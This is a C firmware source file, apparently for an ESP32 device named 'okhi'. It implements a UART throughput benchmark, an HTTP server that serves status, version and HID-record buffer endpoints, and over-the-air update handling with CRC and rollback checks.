        if (*fill > 0)
        {
            *fill = 0;

            if (byte == uart_bench_magic[0])
            {
                uart_bench_rx_frame[(*fill)++] = byte;
            }
        }

        return;
    }

    uart_bench_rx_frame[(*fill)++] = byte;

    if (*fill < UART_BENCH_FRAME_LEN)
    {
        return;
    }

    *fill = 0;

    uint32_t seq = spi_get_u32(uart_bench_rx_frame + UART_BENCH_SEQ_OFF);
    bool good = crc32_buffer(uart_bench_rx_frame + UART_BENCH_CRC_FROM, UART_BENCH_CRC_LEN) ==
                spi_get_u32(uart_bench_rx_frame + UART_BENCH_CRC_OFF);

    if (good)
    {
        spi_bench_fill_pattern(uart_bench_expect, UART_BENCH_PAYLOAD, seed + seq);

        if (memcmp(uart_bench_expect, uart_bench_rx_frame + UART_BENCH_DATA_OFF, UART_BENCH_PAYLOAD) != 0)
        {
            good = false;
        }
    }

    if (good && seq <= *last_seq && *last_seq != 0)
    {
        good = false;
    }

    if (good)
    {
        *last_seq = seq;
        uart_bench_rx_ok++;
    }
    else
    {
        uart_bench_rx_bad++;
    }
}

static void uart_bench_run(void)
{
    uint32_t baud = uart_bench_want_baud;
    uint32_t seed = uart_bench_seed;
    uint8_t token = uart_bench_token;
    bool send = uart_bench_send;

    esp_log_level_set("*", ESP_LOG_NONE);

    uart_wait_tx_done(UART_PORT, pdMS_TO_TICKS(200));
    uart_flush_input(UART_PORT);
    uart_set_baudrate(UART_PORT, baud);

    uint32_t achieved = 0;
    uart_get_baudrate(UART_PORT, &achieved);

    uart_bench_reset_counters();

    uart_bench_baud = achieved;
    uart_bench_acked = token;
    uart_bench_ready = true;

    uint8_t chunk[UART_CHUNK_SIZE];
    uint8_t fill = 0;
    uint32_t last_seq = 0;
    uint32_t tx_seq = 1;
    uint32_t tx_left = 0;
    const uint8_t *tx_cursor = uart_bench_tx_frame;
    bool peer_heard = false;
    int64_t last_rx_ms = bench_now_ms();

    int64_t uart_deadline = bench_now_ms() + BENCH_UART_STEP_CAP_MS;

    while (uart_bench_want_baud == baud && uart_bench_token == token && spi_bench_state == BENCH_RUNNING &&
           bench_now_ms() < uart_deadline)
    {
        int len = uart_read_bytes(UART_PORT, chunk, sizeof(chunk), 0);

        if (len > 0)
        {
            peer_heard = true;
            last_rx_ms = bench_now_ms();
        }

        for (int i = 0; i < len; ++i)
        {
            uart_bench_feed(chunk[i], &fill, seed, &last_seq);
        }

        int wrote = 0;

        // Only transmit while the RP is actively sending: start after we have heard
        // its first bytes (so it is already in its read loop and won't flush our
        // opening frames) and stop once it has gone quiet (so we don't keep sending
        // past the end of its measurement window, which the RP would otherwise score
        // as lost MISO frames). This keeps both directions of the step aligned.
        bool rp_active = peer_heard && (bench_now_ms() - last_rx_ms) <= UART_BENCH_QUIET_MS;

        if (send && rp_active && uart_bench_tx < UINT32_MAX)
        {
            if (tx_left == 0)
            {
                uart_bench_build(uart_bench_tx_frame, seed, tx_seq);
                tx_cursor = uart_bench_tx_frame;
                tx_left = UART_BENCH_FRAME_LEN;
            }

            // Non-blocking: fill only whatever room the TX FIFO has right now and
            // move on, carrying the rest of the frame to the next pass. The old
            // uart_write_bytes() blocked as soon as the 128-byte FIFO was full (two
            // 60-byte frames), so the task stopped calling uart_read_bytes() and the
            // RP->ESP direction read zero bytes forever. Reading must never starve
            // behind a full TX FIFO.
            wrote = uart_tx_chars(UART_PORT, (const char *)tx_cursor, (uint32_t)tx_left);

            if (wrote > 0)
            {
                tx_cursor += wrote;
                tx_left -= (uint32_t)wrote;

                if (tx_left == 0)
                {
                    tx_seq++;
                    uart_bench_tx++;
                }
            }
        }

        if (len <= 0 && wrote <= 0)
        {
            vTaskDelay(1);
        }
    }

    uart_bench_ready = false;

    uart_wait_tx_done(UART_PORT, pdMS_TO_TICKS(500));
    uart_set_baudrate(UART_PORT, RP_UART_BAUD);
    uart_flush_input(UART_PORT);

    esp_log_level_set("*", (esp_log_level_t)CONFIG_LOG_DEFAULT_LEVEL);
}

static void uart_rx_task(void *arg)
{
    (void)arg;

    uint8_t chunk[UART_CHUNK_SIZE];

    while (1)
    {
        if (uart_bench_want_baud != 0)
        {
            uart_bench_run();
            continue;
        }

        // Short block so a UART bench step the RP just requested is picked up
        // within ~10 ms instead of up to 100 ms. The RP's setup handshake only
        // waits so long, and a slow pickup here was making every step fail to
        // arm. In normal operation this only carries the RP's occasional status
        // line, so polling a little more often costs nothing.
        int len = uart_read_bytes(UART_PORT, chunk, sizeof(chunk), pdMS_TO_TICKS(10));
        if (len <= 1)
        {
            continue;
        }

        ESP_LOGD(UART_TAG, "received %d bytes from the RP", len);
        rp_status_publish(chunk, (size_t)len);
    }
}

static int64_t http_now_ms(void)
{
    return esp_timer_get_time() / 1000;
}

static int rp_upload_fd = -1;
static uint32_t rp_upload_crc;

static void ota_cleanup(void)
{
    if (ota_active)
    {
        esp_ota_abort(ota_handle);
        ota_active = false;
    }

    ota_partition = NULL;

    if (rp_upload_fd >= 0)
    {
        close(rp_upload_fd);
        rp_upload_fd = -1;
        unlink(RP_IMAGE_TMP_PATH);
    }
}

static void rp_upload_cleanup(void)
{
    if (rp_upload_fd >= 0)
    {
        close(rp_upload_fd);
        rp_upload_fd = -1;
        unlink(RP_IMAGE_TMP_PATH);
    }
}

static void rp_image_invalidate(void)
{
    __atomic_store_n(&rp_image_ready, false, __ATOMIC_SEQ_CST);

    while (rp_image_in_use)
    {
        vTaskDelay(1);
    }

    rp_commit_pending = false;

    spi_requested_block = SPI_NO_BLOCK;
    rp_window_offset = SPI_NO_BLOCK;
    rp_image_size = 0;
    rp_image_crc = 0;

    if (rp_image_fd >= 0)
    {
        close(rp_image_fd);
        rp_image_fd = -1;
    }
}

static bool rp_image_verify_on_disk(int fd, uint32_t expected_size, uint32_t expected_crc)
{
    if (lseek(fd, 0, SEEK_SET) != 0)
    {
        return false;
    }

    uint32_t crc = 0xffffffffu;
    uint32_t total = 0;

    while (1)
    {
        int got = read(fd, rp_window, RP_WINDOW_SIZE);

        if (got < 0)
        {
            return false;
        }

        if (got == 0)
        {
            break;
        }

        crc = crc32_update(crc, rp_window, (size_t)got);
        total += (uint32_t)got;

        if (total > expected_size)
        {
            return false;
        }
    }

    rp_window_offset = SPI_NO_BLOCK;

    return total == expected_size && (crc ^ 0xffffffffu) == expected_crc;
}

static void app_validation_init(void)
{
    const esp_partition_t *running = esp_ota_get_running_partition();
    esp_ota_img_states_t state = ESP_OTA_IMG_UNDEFINED;

    if (running == NULL || esp_ota_get_state_partition(running, &state) != ESP_OK)
    {
        return;
    }

    if (state != ESP_OTA_IMG_PENDING_VERIFY)
    {
        return;
    }

    app_awaiting_validation = true;
    app_booted_pending = true;
    app_validation_deadline_ms = http_now_ms() + OTA_VALIDATE_TIMEOUT_MS;

    ESP_LOGW(TAG, "running an unconfirmed image, waiting for the first HTTP request");
}

static void app_validation_confirm(void)
{
    if (!app_awaiting_validation)
    {
        return;
    }

    app_awaiting_validation = false;

    if (esp_ota_mark_app_valid_cancel_rollback() == ESP_OK)
    {
        ESP_LOGI(TAG, "image confirmed, rollback cancelled");
    }
}

static void app_validation_check_timeout(int64_t now)
{
    if (!app_awaiting_validation || now <= app_validation_deadline_ms)
    {
        return;
    }

    ESP_LOGE(TAG, "image not confirmed in time, rebooting to roll back");
    esp_restart();
}

static void http_conn_close(http_conn_t *conn)
{
    if (conn->state == HTTP_CONN_BODY && conn == upload_owner)
    {
        if (conn->body_sink == HTTP_BODY_OTA)
        {
            ota_cleanup();
        }
        else
        {
            rp_upload_cleanup();
        }
    }

    if (conn == upload_owner)
    {
        upload_owner = NULL;
    }

    conn->body_sink = HTTP_BODY_NONE;

    conn->send_ptr = NULL;
    conn->send_left = 0;

    if (conn->fd >= 0)
    {
        close(conn->fd);
        conn->fd = -1;
    }

    conn->state = HTTP_CONN_FREE;
    conn->req_len = 0;
    conn->resp_len = 0;
    conn->resp_sent = 0;
}

static void http_reply(http_conn_t *conn, const char *status, const char *content_type, const char *extra_headers,
                       const char *body, size_t body_len)
{
    char header[HTTP_HEADER_MAX];

    int header_len = snprintf(header, sizeof(header),
                              "HTTP/1.1 %s\r\n"
                              "Content-Type: %s\r\n"
                              "Content-Length: %u\r\n"
                              "Cache-Control: no-store\r\n"
                              "Connection: close\r\n"
                              "%s"
                              "\r\n",
                              status, content_type, (unsigned)body_len, extra_headers ? extra_headers : "");

    if (header_len <= 0 || (size_t)header_len >= sizeof(header) ||
        (size_t)header_len + body_len > sizeof(conn->resp))
    {
        const char *fallback = "HTTP/1.1 500 Internal Server Error\r\n"
                               "Content-Length: 0\r\n"
                               "Connection: close\r\n"
                               "\r\n";

        conn->resp_len = strlen(fallback);
        conn->resp_sent = 0;
        memcpy(conn->resp, fallback, conn->resp_len);
        return;
    }

    memcpy(conn->resp, header, (size_t)header_len);
    if (body_len > 0)
    {
        memcpy(conn->resp + header_len, body, body_len);
    }

    conn->resp_len = (size_t)header_len + body_len;
    conn->resp_sent = 0;
}

static void http_reply_no_content(http_conn_t *conn, const char *extra_headers)
{
    int len = snprintf(conn->resp, sizeof(conn->resp),
                       "HTTP/1.1 204 No Content\r\n"
                       "Cache-Control: no-store\r\n"
                       "Connection: close\r\n"
                       "%s"
                       "\r\n",
                       extra_headers ? extra_headers : "");

    conn->resp_len = (len > 0 && (size_t)len < sizeof(conn->resp)) ? (size_t)len : 0;
    conn->resp_sent = 0;
}

static void http_reply_text(http_conn_t *conn, const char *status, const char *body)
{
    http_reply(conn, status, HTTP_TEXT_PLAIN, NULL, body, strlen(body));
}

extern const uint8_t index_html_gz_start[] asm("_binary_index_html_gz_start");
extern const uint8_t index_html_gz_end[] asm("_binary_index_html_gz_end");

static void http_reply_index(http_conn_t *conn)
{
    size_t size = (size_t)(index_html_gz_end - index_html_gz_start);

    int header_len = snprintf(conn->resp, sizeof(conn->resp),
                              "HTTP/1.1 200 OK\r\n"
                              "Content-Type: " HTTP_TEXT_HTML "\r\n"
                              "Content-Encoding: gzip\r\n"
                              "Content-Length: %u\r\n"
                              "Cache-Control: no-cache\r\n"
                              "Connection: close\r\n"
                              "\r\n",
                              (unsigned)size);

    if (header_len <= 0 || (size_t)header_len >= sizeof(conn->resp))
    {
        http_reply_text(conn, "500 Internal Server Error", "header too large\n");
        return;
    }

    conn->send_ptr = index_html_gz_start;
    conn->send_left = size;
    conn->resp_len = (size_t)header_len;
    conn->resp_sent = 0;
}

static bool http_path_is(const char *path, const char *target)
{
    size_t len = strlen(target);

    return strncmp(path, target, len) == 0 && (path[len] == '\0' || path[len] == '?');
}

static bool http_query_uint(const char *path, const char *key, uint32_t *value)
{
    const char *cursor = strchr(path, '?');
    if (cursor == NULL)
    {
        return false;
    }

    size_t key_len = strlen(key);
    cursor++;

    while (*cursor != '\0')
    {
        if (strncmp(cursor, key, key_len) == 0 && cursor[key_len] == '=')
        {
            *value = (uint32_t)strtoul(cursor + key_len + 1, NULL, 10);
            return true;
        }

        const char *next = strchr(cursor, '&');
        if (next == NULL)
        {
            return false;
        }

        cursor = next + 1;
    }

    return false;
}

static int http_hex(char c)
{
    if (c >= '0' && c <= '9')
    {
        return c - '0';
    }

    if (c >= 'a' && c <= 'f')
    {
        return c - 'a' + 10;
    }

    if (c >= 'A' && c <= 'F')
    {
        return c - 'A' + 10;
    }

    return -1;
}

static bool http_query_str(const char *path, const char *key, char *out, size_t out_size)
{
    const char *cursor = strchr(path, '?');

    if (cursor == NULL || out_size == 0)
    {
        return false;
    }

    size_t key_len = strlen(key);

    cursor++;

    while (*cursor != '\0')
    {
        if (strncmp(cursor, key, key_len) == 0 && cursor[key_len] == '=')
        {
            const char *value = cursor + key_len + 1;
            size_t used = 0;

            while (*value != '\0' && *value != '&' && used + 1 < out_size)
            {
                char c = *value++;

                if (c == '+')
                {
                    c = ' ';
                }
                else if (c == '%' && http_hex(value[0]) >= 0 && http_hex(value[1]) >= 0)
                {
                    c = (char)((http_hex(value[0]) << 4) | http_hex(value[1]));
                    value += 2;
                }

                out[used++] = c;
            }

            out[used] = '\0';

            return true;
        }

        const char *next = strchr(cursor, '&');

        if (next == NULL)
        {
            return false;
        }

        cursor = next + 1;
    }

    return false;
}

static void route_buffer(http_conn_t *conn, const char *path)
{
    uint32_t head = hid_ring_head();
    uint32_t cursor = 0;

    bool stateless = http_query_uint(path, "from", &cursor);
    if (!stateless)
    {
        cursor = http_legacy_cursor;
    }

    uint32_t skipped = 0;
    cursor = hid_ring_clamp(cursor, head, &skipped);

    if (!stateless)
    {
        stats.ring_dropped += skipped;
    }

    size_t body_len = 0;
    hid_record_t record;

    while (cursor != head)
    {
        if (!hid_ring_read(cursor, &record))
        {
            break;
        }

        if (body_len + record.len > sizeof(http_body))
        {
            break;
        }

        memcpy(http_body + body_len, record.data, record.len);
        body_len += record.len;
        cursor++;
    }

    if (!stateless)
    {
        http_legacy_cursor = cursor;
    }

    char extra[160];
    snprintf(extra, sizeof(extra), "X-Okhi-Next: %u\r\nX-Okhi-Head: %u\r\nX-Okhi-Skipped: %u\r\n", (unsigned)cursor,
             (unsigned)head, (unsigned)skipped);

    if (body_len == 0)
    {
        http_reply_no_content(conn, extra);
        return;
    }

    http_reply(conn, "200 OK", HTTP_TEXT_PLAIN, extra, http_body, body_len);
}

static void route_esp(http_conn_t *conn)
{
    int len = snprintf(http_body, sizeof(http_body),
                       "records: 0x%x dropped: 0x%x truncated: 0x%x spi_err: 0x%x heap: %u",
                       (unsigned)stats.spi_records, (unsigned)stats.ring_dropped, (unsigned)stats.spi_truncated,
                       (unsigned)(stats.spi_errors + stats.spi_queue_errors), (unsigned)esp_get_free_heap_size());

    if (len <= 0)
    {
        http_reply_no_content(conn, NULL);
        return;
    }

    if ((size_t)len >= sizeof(http_body))
    {
        len = (int)sizeof(http_body) - 1;
    }

    http_reply(conn, "200 OK", HTTP_TEXT_PLAIN, NULL, http_body, (size_t)len);
}

static void route_rp(http_conn_t *conn)
{
    char snapshot[RP_STATUS_MAX];

    rp_status_snapshot(snapshot, sizeof(snapshot));

    if (snapshot[0] == '\0')
    {
        http_reply_no_content(conn, NULL);
        return;
    }

    http_reply_text(conn, "200 OK", snapshot);
}

static void hw_version_refresh(void)
{
    if (hw_version_known)
    {
        return;
    }

    char snapshot[RP_STATUS_MAX];

    rp_status_snapshot(snapshot, sizeof(snapshot));

    char *found = strstr(snapshot, "HWv");
    if (found == NULL)
    {
        return;
    }

    snprintf(hw_version, sizeof(hw_version), "%s", found + 2);

    size_t end = strcspn(hw_version, " \t\r\n");
    hw_version[end] = '\0';

    hw_version_known = end != 0;
}

static const char *rp_link_state(void)
{
    if (rp_frame_version == 0)
    {
        return "no rp seen";
    }

    uint32_t age = (uint32_t)(esp_timer_get_time() / 1000) - rp_last_seen_ms;

    if (age > RP_LINK_STALE_MS)
    {
        return "stale";
    }

    if (rp_frame_version != SPI_FRAME_VERSION)
    {
        return "protocol mismatch";
    }

    return "up";
}

static const char *rp_variant_name(void)
{
    const char *space = strchr(rp_identity, ' ');

    if (space == NULL)
    {
        return "";
    }

    if (strncmp(space + 1, OKHI_VARIANT_USB " ", 4) == 0)
    {
        return OKHI_VARIANT_USB;
    }

    if (strncmp(space + 1, OKHI_VARIANT_PS2 " ", 4) == 0)
    {
        return OKHI_VARIANT_PS2;
    }

    return "";
}

static const char *reset_reason_name(void)
{
    switch (esp_reset_reason())
    {
    case ESP_RST_POWERON:
        return "poweron";
    case ESP_RST_EXT:
        return "external pin";
    case ESP_RST_SW:
        return "software restart";
    case ESP_RST_PANIC:
        return "panic";
    case ESP_RST_INT_WDT:
        return "interrupt watchdog";
    case ESP_RST_TASK_WDT:
        return "task watchdog";
    case ESP_RST_WDT:
        return "other watchdog";
    case ESP_RST_DEEPSLEEP:
        return "deep sleep wake";
    case ESP_RST_BROWNOUT:
        return "brownout";
    case ESP_RST_SDIO:
        return "sdio";
    default:
        return "unknown";
    }
}

static const char *ota_stage_name(void)
{
    if (!ota_active)
    {
        return "idle";
    }

    switch (ota_stage)
    {
    case OTA_STAGE_HEADER:
        return "header";
    case OTA_STAGE_ESP:
        return "esp image";
    case OTA_STAGE_RP:
        return "rp image";
    default:
        return "done";
    }
}

static void route_hwver(http_conn_t *conn)
{
    hw_version_refresh();

    if (!hw_version_known)
    {
        http_reply_no_content(conn, NULL);
        return;
    }

    http_reply_text(conn, "200 OK", hw_version);
}

static void route_versions(http_conn_t *conn)
{
    const esp_app_desc_t *description = esp_app_get_description();
    char version_stamp[48];

    wifi_build_stamp(version_stamp, sizeof(version_stamp));
    const esp_partition_t *running = esp_ota_get_running_partition();

    hw_version_refresh();

    int len = snprintf(http_body, sizeof(http_body),
                       "esp_version=%s\n"
                       "esp_variant=%s\n"
                       "esp_build=%s %s\n"
                       "esp_image=%s\n"
                       "esp_idf=%s\n"
                       "esp_partition=%s\n"
                       "rp_identity=%s\n"
                       "rp_variant=%s\n"
                       "rp_hardware=%s\n"
                       "esp_proto=%d\n"
                       "rp_proto=%d\n"
                       "reset_times=%u\n"
                       "link=%s\n",
                       FIRMV_STR, description->version, description->date, description->time, version_stamp,
                       description->idf_ver,
                       running ? running->label : "unknown", rp_identity[0] ? rp_identity : "", rp_variant_name(),
                       hw_version_known ? hw_version : "", SPI_FRAME_VERSION, rp_frame_version,
                       (unsigned)esp_reset_times, rp_link_state());

    if (len <= 0)
    {
        http_reply_no_content(conn, NULL);
        return;
    }

    if ((size_t)len >= sizeof(http_body))
    {
        len = (int)sizeof(http_body) - 1;
    }

    http_reply(conn, "200 OK", HTTP_TEXT_PLAIN, NULL, http_body, (size_t)len);
}

static void route_stats(http_conn_t *conn)
{
    static wifi_sta_list_t sta_list;

    memset(&sta_list, 0, sizeof(sta_list));
    esp_wifi_ap_get_sta_list(&sta_list);

    const esp_partition_t *running = esp_ota_get_running_partition();
    const esp_app_desc_t *description = esp_app_get_description();

    int len = snprintf(http_body, sizeof(http_body),
                       "firmware=%s\n"
                       "variant=%s\n"
                       "partition=%s\n"
                       "reset_reason=%s\n"
                       "pending_verify=%d\n"
                       "booted_pending=%d\n"
                       "uptime_s=%u\n"
                       "free_heap=%u\n"
                       "min_free_heap=%u\n"
                       "largest_free_block=%u\n"
                       "stations=%d\n"
                       "link=%s\n"
                       "rp_link_age_ms=%u\n"
                       "rp_variant=%s\n"
                       "rp_proto=%d\n"
                       "spi_transactions=%u\n"
                       "spi_records=%u\n"
                       "spi_empty=%u\n"
                       "spi_truncated=%u\n"
                       "spi_errors=%u\n"
                       "spi_queue_errors=%u\n"
                       "spi_polls=%u\n"
                       "spi_proto_mismatch=%u\n"
                       "spi_blocks_served=%u\n"
                       "rp_image_ready=%d\n"
                       "rp_image_size=%u\n"
                       "rp_image_crc=%08x\n"
                       "spi_last_record_bits=%u\n"
                       "spi_last_empty_bits=%u\n"
                       "spi_last_empty_head=%02x %02x %02x %02x %02x %02x %02x %02x\n"
                       "ring_entries=%u\n"
                       "ring_head=%u\n"
                       "ring_dropped=%u\n"
                       "http_requests=%u\n"
                       "http_rejected=%u\n"
                       "ota_stage=%s\n"
                       "ota_uploads_ok=%u\n"
                       "ota_uploads_failed=%u\n"
                       "ota_last_error=%s\n"
                       "rp_commit_pending=%d\n"
                       "rp_commit_completed=%d\n"
                       "esp_reboot_pending=%d\n",
                       FIRMV_STR, description->version, running ? running->label : "unknown", reset_reason_name(),
                       app_awaiting_validation ? 1 : 0, app_booted_pending ? 1 : 0,
                       (unsigned)(esp_timer_get_time() / 1000000),
                       (unsigned)esp_get_free_heap_size(),
                       (unsigned)esp_get_minimum_free_heap_size(),
                       (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_DEFAULT), sta_list.num,
                       rp_link_state(),
                       (unsigned)((uint32_t)(esp_timer_get_time() / 1000) - rp_last_seen_ms), rp_variant_name(),
                       rp_frame_version, (unsigned)stats.spi_transactions,
                       (unsigned)stats.spi_records, (unsigned)stats.spi_empty, (unsigned)stats.spi_truncated,
                       (unsigned)stats.spi_errors, (unsigned)stats.spi_queue_errors, (unsigned)stats.spi_polls,
                       (unsigned)stats.spi_proto_mismatch, (unsigned)spi_blocks_served, rp_image_ready ? 1 : 0,
                       (unsigned)rp_image_size, (unsigned)rp_image_crc,
                       (unsigned)spi_last_record_bits, (unsigned)spi_last_empty_bits, spi_last_empty_head[0],
                       spi_last_empty_head[1], spi_last_empty_head[2], spi_last_empty_head[3],
                       spi_last_empty_head[4], spi_last_empty_head[5], spi_last_empty_head[6],
                       spi_last_empty_head[7], (unsigned)RING_ENTRIES,
                       (unsigned)hid_ring_head(), (unsigned)stats.ring_dropped, (unsigned)stats.http_requests,
                       (unsigned)stats.http_rejected, ota_stage_name(), (unsigned)ota_uploads_ok,
                       (unsigned)ota_uploads_failed, ota_last_error, rp_commit_pending ? 1 : 0,
                       rp_commit_completed ? 1 : 0, ota_reboot_pending ? 1 : 0);

    if (len <= 0)
    {
        http_reply_no_content(conn, NULL);
        return;
    }

    if ((size_t)len >= sizeof(http_body))
    {
        len = (int)sizeof(http_body) - 1;
    }

    http_reply(conn, "200 OK", HTTP_TEXT_PLAIN, NULL, http_body, (size_t)len);
}

static bool http_prefix_matches(const char *text, const char *prefix)
{
    while (*prefix != '\0')
    {
        char a = *text;
        char b = *prefix;

        if (a >= 'A' && a <= 'Z')
        {
            a = (char)(a + 32);
        }

        if (b >= 'A' && b <= 'Z')
        {
            b = (char)(b + 32);
        }

        if (a != b)
        {
            return false;
        }

        text++;
        prefix++;
    }

    return true;
}

static bool http_content_length(const char *request, size_t *value)
{
    const char *name = "content-length:";
    const char *cursor = strchr(request, '\n');

    while (cursor != NULL)
    {
        cursor++;

        if (http_prefix_matches(cursor, name))
        {
            cursor += strlen(name);

            while (*cursor == ' ' || *cursor == '\t')
            {
                cursor++;
            }

            *value = (size_t)strtoul(cursor, NULL, 10);
            return true;
        }

        cursor = strchr(cursor, '\n');
    }

    return false;
}

static bool http_expects_continue(const char *request)
{
    const char *cursor = strchr(request, '\n');

    while (cursor != NULL)
    {
        cursor++;

        if (http_prefix_matches(cursor, "expect:"))
        {
            return true;
        }

        cursor = strchr(cursor, '\n');
    }

    return false;
}

static void ota_reset_stream(void)
{
    ota_stage = OTA_STAGE_HEADER;
    ota_header_got = 0;
    ota_is_package = false;
    ota_esp_len = 0;
    ota_esp_crc = 0;
    ota_esp_got = 0;
    ota_esp_running = 0xffffffffu;
    ota_rp_len = 0;
    ota_rp_crc = 0;
    ota_rp_got = 0;
    ota_rp_running = 0xffffffffu;
    ota_esp_validated = false;
    ota_rp_validated = false;
}

static void ota_nvs_set_rp_pending(uint32_t size, uint32_t crc)
{
    nvs_handle_t handle;

    if (nvs_open(OTA_NVS_NAMESPACE, NVS_READWRITE, &handle) != ESP_OK)
    {
        return;
    }

    nvs_set_u32(handle, "rp_size", size);
    nvs_set_u32(handle, "rp_crc", crc);
    nvs_set_u32(handle, "rp_pending", 1);
    nvs_commit(handle);
    nvs_close(handle);
}

static void ota_nvs_clear_rp_pending(void)
{
    nvs_handle_t handle;

    if (nvs_open(OTA_NVS_NAMESPACE, NVS_READWRITE, &handle) != ESP_OK)
    {
        return;
    }

    nvs_set_u32(handle, "rp_pending", 0);
    nvs_commit(handle);
    nvs_close(handle);
}

static bool ota_nvs_get_rp_pending(uint32_t *size, uint32_t *crc)
{
    nvs_handle_t handle;
    uint32_t pending = 0;

    if (nvs_open(OTA_NVS_NAMESPACE, NVS_READONLY, &handle) != ESP_OK)
    {
        return false;
    }

    if (nvs_get_u32(handle, "rp_pending", &pending) != ESP_OK)
    {
        pending = 0;
    }

    if (pending != 0)
    {
        if (nvs_get_u32(handle, "rp_size", size) != ESP_OK || nvs_get_u32(handle, "rp_crc", crc) != ESP_OK)
        {
            pending = 0;
        }
    }

    nvs_close(handle);

    return pending != 0;
}

static void rp_image_restore_after_boot(void)
{
    struct stat info;
    uint32_t size = 0;
    uint32_t crc = 0;

    unlink(RP_IMAGE_TMP_PATH);

    if (!ota_nvs_get_rp_pending(&size, &crc))
    {
        return;
    }

    if (stat(RP_IMAGE_PATH, &info) != 0 || (uint32_t)info.st_size != size)
    {
        ESP_LOGW(TAG, "pending RP image is missing or truncated, dropping it");
        ota_nvs_clear_rp_pending();
        return;
    }

    int fd = open(RP_IMAGE_PATH, O_RDONLY);
    if (fd < 0)
    {
        ota_nvs_clear_rp_pending();
        return;
    }

    if (!rp_image_verify_on_disk(fd, size, crc))
    {
        ESP_LOGE(TAG, "pending RP image failed its crc on flash, dropping it");
        close(fd);
        unlink(RP_IMAGE_PATH);
        ota_nvs_clear_rp_pending();
        return;
    }

    rp_image_fd = fd;
    rp_image_size = size;
    rp_image_crc = crc;
    rp_window_offset = SPI_NO_BLOCK;
    spi_requested_block = SPI_NO_BLOCK;
    rp_commit_pending = true;
    __atomic_store_n(&rp_image_ready, true, __ATOMIC_SEQ_CST);

    ESP_LOGW(TAG, "RP update pending: %u bytes crc %08x", (unsigned)size, (unsigned)crc);
}

static void ota_fail(http_conn_t *conn, const char *reason)
{
    char body[160];

    ota_cleanup();

    snprintf(ota_last_error, sizeof(ota_last_error), "%s", reason);
    ota_uploads_failed++;

    ESP_LOGE(TAG, "OTA failed: %s", reason);
    snprintf(body, sizeof(body), "OTA failed: %s\n", reason);

    conn->state = HTTP_CONN_SEND;
    conn->deadline_ms = http_now_ms() + HTTP_SEND_TIMEOUT_MS;
    http_reply_text(conn, "500 Internal Server Error", body);
}

static bool ota_begin(http_conn_t *conn, size_t length)
{
    if (ota_active || rp_upload_fd >= 0)
    {
        ota_fail(conn, "another upload is already in progress");
        return false;
    }

    ota_partition = esp_ota_get_next_update_partition(NULL);
    if (ota_partition == NULL)
    {
        ota_fail(conn, "no OTA partition, this build uses the old single-slot table");
        return false;
    }

    if (length < OTA_PKG_HEADER_SIZE + 1)
    {
        ota_fail(conn, "upload is too small to be a firmware image or a package");
        return false;
    }

    ota_reset_stream();

    conn->body_expected = length;
    conn->body_received = 0;

    ESP_LOGI(TAG, "upload started, %u bytes", (unsigned)length);

    return true;
}

static bool ota_start_esp_image(http_conn_t *conn, uint32_t length)
{
    if (length < OTA_MIN_IMAGE_SIZE || length > ota_partition->size)
    {
        char reason[96];

        snprintf(reason, sizeof(reason), "esp image size %u out of range (%u..%u)", (unsigned)length,
                 (unsigned)OTA_MIN_IMAGE_SIZE, (unsigned)ota_partition->size);
        ota_fail(conn, reason);

        return false;
    }

    if (esp_ota_begin(ota_partition, length, &ota_handle) != ESP_OK)
    {
        ota_fail(conn, "esp_ota_begin failed");
        return false;
    }

    ota_active = true;
    ota_esp_len = length;
    ota_stage = OTA_STAGE_ESP;

    ESP_LOGI(TAG, "esp image %u bytes into %s", (unsigned)length, ota_partition->label);

    return true;
}

static bool ota_parse_package_header(http_conn_t *conn)
{
    if (memcmp(ota_header, "OKHI", 4) != 0)
    {
        ota_fail(conn, "not an okhi package and not a raw esp image");
        return false;
    }

    if (spi_get_u32(ota_header + 4) != OTA_PKG_FORMAT_VERSION)
    {
        ota_fail(conn, "unsupported package format version");
        return false;
    }

    if (crc32_buffer(ota_header, OTA_PKG_HEADER_SIZE - 4) != spi_get_u32(ota_header + 28))
    {
        ota_fail(conn, "package header crc mismatch");
        return false;
    }

    if (strncmp((const char *)(ota_header + 8), WIFI_PREFIX, 4) != 0)
    {
        ota_fail(conn, "package belongs to a different okhi variant");
        return false;
    }

    ota_esp_len = spi_get_u32(ota_header + 12);
    ota_esp_crc = spi_get_u32(ota_header + 16);
    ota_rp_len = spi_get_u32(ota_header + 20);
    ota_rp_crc = spi_get_u32(ota_header + 24);

    if (ota_rp_len > RP_IMAGE_MAX_SIZE)
    {
        ota_fail(conn, "rp image in the package is too large");
        return false;
    }

    if ((size_t)OTA_PKG_HEADER_SIZE + ota_esp_len + ota_rp_len != conn->body_expected)
    {
        ota_fail(conn, "package lengths do not add up to Content-Length");
        return false;
    }

    ota_is_package = true;

    ESP_LOGI(TAG, "package: esp %u bytes, rp %u bytes", (unsigned)ota_esp_len, (unsigned)ota_rp_len);

    return true;
}

static bool ota_open_rp_stage(http_conn_t *conn)
{
    rp_upload_fd = open(RP_IMAGE_TMP_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (rp_upload_fd < 0)
    {
        ota_fail(conn, "could not create " RP_IMAGE_TMP_PATH);
        return false;
    }

    ota_stage = OTA_STAGE_RP;

    return true;
}

static bool ota_finish_esp_image(http_conn_t *conn)
{
    esp_app_desc_t incoming;

    if (ota_is_package && (ota_esp_running ^ 0xffffffffu) != ota_esp_crc)
    {
        ota_fail(conn, "esp image crc does not match the package header");
        return false;
    }

    esp_err_t err = esp_ota_end(ota_handle);
    ota_active = false;

    if (err != ESP_OK)
    {
        ota_fail(conn, err == ESP_ERR_OTA_VALIDATE_FAILED ? "esp image failed validation" : "esp_ota_end failed");
        return false;
    }

    if (esp_ota_get_partition_description(ota_partition, &incoming) != ESP_OK)
    {
        ota_fail(conn, "could not read the app descriptor");
        return false;
    }

    const esp_app_desc_t *running = esp_app_get_description();

    if (strncmp(incoming.project_name, running->project_name, sizeof(incoming.project_name)) != 0 ||
        strncmp(incoming.version, running->version, sizeof(incoming.version)) != 0)
    {
        ota_fail(conn, "esp image belongs to a different okhi variant");
        return false;
    }

    ota_esp_validated = true;

    ESP_LOGW(TAG, "esp image validated, not committed yet");

    return true;
}

static bool ota_finish_rp_image(http_conn_t *conn)
{
    close(rp_upload_fd);
    rp_upload_fd = -1;

    if ((ota_rp_running ^ 0xffffffffu) != ota_rp_crc)
    {
        ota_fail(conn, "rp image crc does not match the package header");
        return false;
    }

    int fd = open(RP_IMAGE_TMP_PATH, O_RDONLY);
    if (fd < 0)
    {
        ota_fail(conn, "could not reopen the staged rp image");
        return false;
    }

